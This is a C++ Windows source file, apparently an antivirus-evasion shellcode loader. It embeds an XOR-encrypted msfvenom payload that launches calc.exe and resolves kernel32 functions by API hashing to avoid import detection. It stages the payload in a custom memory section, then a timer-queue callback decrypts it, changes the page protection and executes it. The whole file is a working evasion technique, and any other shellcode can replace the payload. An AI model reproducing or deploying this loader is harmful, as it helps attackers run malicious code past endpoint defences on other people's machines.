#include <windows.h>
#include <iostream>
#include <cstring>

#include "Structs.h"
#include "GetModFunc.h"

#ifndef STRUCTS
#include <winternl.h>
#endif // !STRUCTS

#include <algorithm>
#include <cstddef>
#include <stdexcept>
#include <iterator>
#include <type_traits>

#define KERNEL32DLL_HASH                0x367DC15A
#define VIRTUALALLOC_HASH               0x73CC53E5
#define VIRTUALFREE_HASH                0x17E5CC9B
#define CREATETIMERQUEUE_HASH           0x11936668
#define CREATETIMERQUEUETIMER_HASH      0x612C3DD4
#define DELETETIMERQUEUETIMER_HASH      0x47DCA02D
#define DELETETIMERQUEUE_HASH           0x5EFD9A00

const char xorKey[] = "racoten";
const size_t keyLen = sizeof(xorKey) - 1;

// msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=process -f c -b \x00\x0a\x0d --encrypt xor --encrypt-key racoten --nopsled 500 --sec-name bitdefender
unsigned char encryptedPayload[] =
"\x8b\x9c\xfb\xff\xed\xf6\xf1\xe1\xf2\x9b\x92\xeb\xf5\xf0\x8a\xfe\xfb\xfd\xef\xfb\xf1\xe1\x98\x9b\xf7\x8c\xf7\xff"
"\xeb\xff\xf8\x92\x8c\xfe\xf1\xed\x98\xfc\xfe\xea\x99\xf1\xed\xfe\x9e\xfd\xed\xfb\x93\xe0\x98\x9a\x96\xef\xf6\xf5"
"\xeb\xf0\xfd\x93\xed\xfe\xf0\xea\xfa\xf8\xf1\x8d\xf6\xf0\xe9\xf3\x9a\xf4\xe5\xfa\x93\xeb\xf3\xf1\xf1\xe4\x99\xf0"
"\xe2\x99\xf2\xf0\x89\xf7\xf7\xea\xfa\x9b\xfe\xed\xf5\xfd\xed\xf3\xf1\xff\xef\xf7\x96\xec\x99\xf2\xf1\x89\x9c\xff"
"\xe9\x99\xf3\x93\xef\x9d\xf0\xe0\xf2\xfd\xff\xe4\x9c\xfe\xe9\xf3\xfb\xfe\xed\xfd\x93\x8b\xff\xf3\xf4\xef\xf4\xff"
"\xe0\x9c\xf0\x97\xeb\x9c\xfc\x8e\xf3\xf8\x97\x8d\xf7\xf1\x8a\x98\x9e\xf7\xe5\x9d\x96\x8b\xf3\x9e\x92\xe4\x98\xf0"
"\xe3\xf0\xfd\xfd\x8d\xfb\xf5\x8f\xf8\xfd\x93\xed\xf6\x93\xe0\xf3\xfc\x92\xe4\x9c\xf5\x8e\x98\xfd\xf4\xed\xf5\xfd"
"\x8b\xf1\x9b\xf1\xef\xfd\xf1\xe9\xf0\xfb\xfd\xea\xfc\xfe\xec\xfe\xf1\x96\xec\xfb\x92\x8a\xf2\xfb\x97\xe5\xf7\x92"
"\xe9\x9d\x9b\x92\xea\x99\x96\x8b\xf3\xfc\xff\xef\xfc\xf1\xeb\xf8\xf3\xf6\xeb\x9d\x93\xeb\xf2\xfa\xf0\x89\x9c\xf0"
"\x8b\xf8\xf2\xfc\xef\xf5\xf6\xec\xfe\xf1\x93\x88\x98\x92\x8f\x9d\xf1\x93\xec\x9c\x93\xea\xf3\x9a\x96\xe6\xf7\x92"
"\xe9\xfa\xfc\xf0\xec\xf7\x92\xe3\x99\xf3\xff\xec\xf5\x96\xe9\xf1\x9a\xfc\xe6\x99\xfd\xe2\xf2\xf1\xff\x8d\x9d\x92"
"\x8e\x98\xfd\xf6\xea\x9c\xfe\x8b\x99\xf0\x97\xea\xf7\xff\xea\x9d\x9f\xf4\xe5\x98\x92\xeb\x9d\x9e\x96\xeb\x98\xf0"
"\xea\x9c\x9f\xf0\xea\xfd\xfd\x8b\xf0\xfb\xfe\x88\xf4\xfc\xed\x9d\xfa\xf7\x88\xf5\xf6\x8b\xfa\xf8\xfd\xef\xfc\xfd"
"\xed\xff\xf8\xf4\xe6\xfd\xff\x8a\xf9\xf8\xff\x8c\x99\xff\x8a\x9c\x9a\xf0\xef\x99\xfd\x8f\x99\x9b\xf1\xe4\xfc\xfd"
"\x8a\x9d\xf1\xf6\xeb\xfb\x97\xe1\x98\xf2\xf1\x89\xf6\xfe\xeb\x98\xf1\xf6\xec\xf4\xf0\x8e\x98\xfa\x96\xea\x98\x92"
"\x8e\x98\xf8\xff\xe4\x9d\xff\xeb\xf9\xf2\xf0\xef\xfc\xf1\x8e\xfe\x9b\x92\x8c\xf5\xfd\xe0\x9d\xf0\xff\xec\xfa\x97"
"\xea\xf3\xfc\xff\x8d\x9d\xf5\xe9\xf1\x9e\xf4\xec\x99\xf6\xe2\xf1\xf8\x97\xeb\xf6\xfc\x8a\x99\xfb\x92\xe5\xf5\x93"
"\xec\xf3\x9e\xff\xe4\xf4\x96\xea\xf9\xf1\x97\xec\xfc\xf5\x8e\x99\xf0\x97\x8d\xf4\xff\xe0\xf9\xf1\x27\x45\xac\x26"
"\xf3\x88\xbe\x90\x8b\x9a\x26\xff\x64\x8c\x90\x8b\x9a\x26\xc9\xd9\x8c\x5c\xf8\x0a\x21\xd8\x1d\x2b\x5e\x2c\x42\x26"
"\x5f\x99\x9c\x90\x8b\x87\x9a\x36\xc6\xd3\x07\xeb\xc2\x04\x0e\xd9\x8c\x1d\xa9\x4b\x71\x8a\x4c\x8d\xc8\x76\x3b\x64"
"\x75\x40\x4d\xb7\xd3\xdd\xb0\x05\x66\x42\x41\xec\xc2\xd6\x8c\x5e\x64\xca\xbf\x97\xcb\x0c\xdc\xc5\x68\xef\xd9\x7a"
"\xa1\x33\x93\x02\x17\xef\x53\x0b\x47\x5d\xa2\x1a\xeb\x26\xe3\x8b\xcd\x0d\xb0\x81\x73\xf8\x96\x99\xbc\x0f\xe8\xd1"
"\xb6\x4b\x97\xd7\x9b\x56\xaa\x98\xee\xbd\x74\x84\x8b\x8d\xae\x85\x64\xdd\x4c\x56\xc1\x61\xa4\x0d\xf0\x3d\x4f\x9e"
"\x62\x9b\xae\x8b\x0f\x47\x5a\xcb\x58\x1d\xd2\xd2\x62\xf5\xce\x75\xcd\x9d\x31\x07\x60\xd9\xdc\xe3\x60\x32\x18\x4d"
"\x3e\x87\x3b\xdf\xde\x6f\x33\x68\xf6\x91\x57\x47\xca\x79\xb7\x0f\xfc\xa3\x49\x56\x8d\x09\xa9\x87\x60\xc2\x50\xd7"
"\x4d\x13\x64\x04\xb3\x87\x13\x1a\xcf\x08\xa2\x43\x74\x9d\x54\x98\xd4\x1d\xa1\x4b\x7b\x90\x9e\x37\xa0\x06\xbb\xfe"
"\xdd\x93\x5e\x8e\xc1\x1e\x69\x0f\xc7\x9e\xec\x33\x75\x00\xb6\xb4\x2d\xc5\x08\xdd\x81\x41\xed\x0c\x68\x53\x94\xd7"
"\x9c\x52\xef\x41\x81\xfe\x99\xa5\x09\xaf\x36\xa0\xda\x71\xac\x8f\xcd\xe6\x5e\x9f\x9c\x45\xe2\x0e\xc8\xc4\x2d\x29"
"\x01\xcd\x63\xdd\x1b\xad\x02\x68\x2b\x72\x54\xdf\xf8\x32\x94\x0e\x75\x84\x81\x07\x7e\x94\x8e\x6d\x4c\xbd\x37\xb3"
"\xe5\x37\xef\x00\x3b\xcf\x12";
unsigned int payload_len = sizeof(encryptedPayload);

#ifdef _MSC_VER
#pragma section(".myexec", read, write)
#pragma comment(linker, "/SECTION:.myexec,RW")
__declspec(allocate(".myexec")) static unsigned char g_execMem[sizeof(encryptedPayload)];
#else
static unsigned char g_execMem[sizeof(encryptedPayload)]
__attribute__((section(".myexec"), used));
#endif

namespace overly_complicated {

    class RawIterator {
    public:
        using iterator_category = std::random_access_iterator_tag;
        using value_type = char;
        using difference_type = std::ptrdiff_t;
        using pointer = char*;
        using reference = char&;

        RawIterator(pointer ptr) : m_ptr(ptr) {}

        reference operator*() const { return *m_ptr; }
        RawIterator& operator++() { ++m_ptr; return *this; }
        RawIterator operator++(int) { RawIterator temp(*this); ++m_ptr; return temp; }
        bool operator==(const RawIterator& other) const { return m_ptr == other.m_ptr; }
        bool operator!=(const RawIterator& other) const { return m_ptr != other.m_ptr; }
        RawIterator& operator+=(difference_type n) { m_ptr += n; return *this; }
        RawIterator operator+(difference_type n) const { return RawIterator(m_ptr + n); }

    private:
        pointer m_ptr;
    };

    void* complicated_memcpy(void* dest, const void* src, std::size_t len) {
        auto validate = [&]() {
            if (!dest || !src) {
                throw std::invalid_argument("cooked");
            }
            };
        validate();

        auto d = static_cast<char*>(dest);
        auto s = static_cast<const char*>(src);

        RawIterator destBegin(d);

        auto copy_operation = [&]() -> RawIterator {
            return std::copy(s, s + len, destBegin);
            };

        RawIterator result = copy_operation();
        return dest;
    }
}

VOID CALLBACK ShellcodeTimerCallback(PVOID lpParam, BOOLEAN TimerOrWaitFired)
{
    unsigned char* buffer = reinterpret_cast<unsigned char*>(lpParam);

    for (unsigned int i = 0; i < payload_len; i++) {
        buffer[i] ^= xorKey[i % keyLen];
    }

    DWORD oldProtect = 0;
    if (!VirtualProtect(g_execMem, payload_len, PAGE_EXECUTE_WRITECOPY, &oldProtect)) {
        DWORD err = GetLastError();
        return;
    }

    void (*func)() = reinterpret_cast<void (*)()>(buffer);
    func();
}

typedef HANDLE(WINAPI* CreateTimerQueue_t)(void);
typedef BOOL(WINAPI* CreateTimerQueueTimer_t)(
    PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
typedef BOOL(WINAPI* DeleteTimerQueueTimer_t)(HANDLE, HANDLE, HANDLE);
typedef BOOL(WINAPI* DeleteTimerQueue_t)(HANDLE);

int main()
{
    HMODULE hKernel32 = GetModuleHandleHash(KERNEL32DLL_HASH);
    if (!hKernel32) {
        return 1;
    }

    CreateTimerQueue_t      pCreateTimerQueue =
        reinterpret_cast<CreateTimerQueue_t>(GetProcAddressHash(hKernel32, CREATETIMERQUEUE_HASH));
    CreateTimerQueueTimer_t pCreateTimerQueueTimer =
        reinterpret_cast<CreateTimerQueueTimer_t>(GetProcAddressHash(hKernel32, CREATETIMERQUEUETIMER_HASH));
    DeleteTimerQueueTimer_t pDeleteTimerQueueTimer =
        reinterpret_cast<DeleteTimerQueueTimer_t>(GetProcAddressHash(hKernel32, DELETETIMERQUEUETIMER_HASH));
    DeleteTimerQueue_t      pDeleteTimerQueue =
        reinterpret_cast<DeleteTimerQueue_t>(GetProcAddressHash(hKernel32, DELETETIMERQUEUE_HASH));

    if (!pCreateTimerQueue || !pCreateTimerQueueTimer ||
        !pDeleteTimerQueue || !pDeleteTimerQueueTimer)
    {
        return 1;
    }

    // Copy encrypted payload into our pre-allocated executable buffer
    overly_complicated::complicated_memcpy(g_execMem, encryptedPayload, payload_len);

    // Start the timer queue
    HANDLE hTimerQueue = pCreateTimerQueue();
    if (!hTimerQueue) {
        return 1;
    }
    
    HANDLE hTimer = NULL;
    if (!pCreateTimerQueueTimer(
        &hTimer,
        hTimerQueue,
        ShellcodeTimerCallback,
        g_execMem,       // Pass pointer to the .myexec buffer
        3000,
        0,
        0))
    {
        pDeleteTimerQueue(hTimerQueue);
        return 1;
    }

    // Wait for user input before cleaning up
    std::cin.get();

    if (hTimer) {
        pDeleteTimerQueueTimer(hTimerQueue, hTimer, NULL);
    }
    pDeleteTimerQueue(hTimerQueue);

    std::cout << std::endl;
    return 0;
}
